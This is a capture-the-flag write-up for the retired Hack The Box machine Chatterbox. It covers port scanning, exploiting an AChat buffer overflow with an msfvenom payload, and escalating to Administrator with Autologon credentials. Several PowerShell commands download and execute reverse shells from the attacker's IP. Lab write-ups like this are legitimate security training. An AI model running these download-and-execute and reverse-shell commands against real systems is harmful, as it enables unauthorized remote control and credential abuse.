# Chatterbox

This is the write-up for the box Chatterbox that got retired at the 16th June 2018.
My IP address was 10.10.14.7 while I did this.

Let's put this in our hosts file:
```markdown
10.10.10.74    chatterbox.htb
```

## Enumeration

Starting with a Nmap scan:

```markdown
nmap -sC -sV -o nmap/chatterbox.nmap 10.10.10.74
```

```markdown
All 1000 scanned ports on 10.10.10.74 are filtered
```

Full TCP port scan:
```markdown
nmap -p- -o nmap/allports_chatterbox.nmap 10.10.10.74
```

```markdown
PORT      STATE   SERVICE
9255/tcp  open    mon
9256/tcp  open    unknown
```

Scanning the services on these ports:
```markdown
nmap -sC -sV -p 9255,9256 -o nmap/ports_chatterbox.nmap 10.10.10.74
```

```markdown
PORT     STATE SERVICE VERSION
9255/tcp open  http    AChat chat system httpd
|_http-server-header: AChat
|_http-title: Site doesn't have a title.
9256/tcp open  achat   AChat chat system
```

## Checking AChat chat system (Port 9255 & 9256)

On the web page of this **AChat chat system** there is a blank page.

Lets search for vulnerabilities for **AChat**:
```markdown
searchsploit achat
```

There is one vulnerability that is a Remote Buffer Overflow that we are going to use.
In this Python script, the server address has to be changed to 10.10.10.74 and we will modify the payload as it only executes _calc.exe_ by default.
Instead we will use a Powershell command to upload a reverse shell from our local client:
```markdown
msfvenom -a x86 --platform Windows -p windows/exec CMD="powershell \"IEX(New-Object Net.WebClient).downloadString('http://10.10.14.7/shell.ps1')\"" -e x86/unicode_mixed -b '\x00\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff' BufferRegister=EAX -f python
```

The generated payload from **Msfvenom** has to replace the default payload.
The shell which I upload is from the **Nishang framework** called _Invoke-PowershellTcp.ps1_. This needs to be renamed to _shell.ps1_ as I have called it in the payload.

Now starting a local web server and a listener on port 9001 and the Python script can be executed.
```markdown
python 36025.py
```

After executing, it downloads the _shell.ps1_ and starts a reverse shell on my IP and port 9001 as the user _alfred_.

## Privilege Escalation

To get an attack surface on the box, it is good to run any **Windows Enumeration Script**:
```powershell
IEX(New-Object Net.WebClient).downloadString('http://10.10.14.7:8000/PowerUp.ps1')

Invoke-AllChecks
```

After it did all checks, it finds Autologon credentials in the registry:
```markdown
DefaultDomainName    :      
DefaultUserName      : Alfred
DefaultPassword      : Welcome1!
```

On the box are three users:
```markdown
net users
```
- Alfred
- Guest
- Administrator

Lets create a credential variable with this password and try to run commands as _Administrator_:
```powershell
$SecPass = ConvertTo-SecureString 'Welcome1!' -AsPlainText -Force

$cred = New-Object System.Management.Automation.PSCredential('Administrator', $SecPass)

Start-Process -FilePath "powershell" -argumentlist "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.7/shellasadmin.ps1')" -Credential $cred
```

This starts a process and downloads the same _shell.ps1_ from before but I changed the port to 9002 and called the script _shellasadmin.ps1_.
After executing this command the listener on my IP and port 9002 starts a reverse shell as _Administrator_!
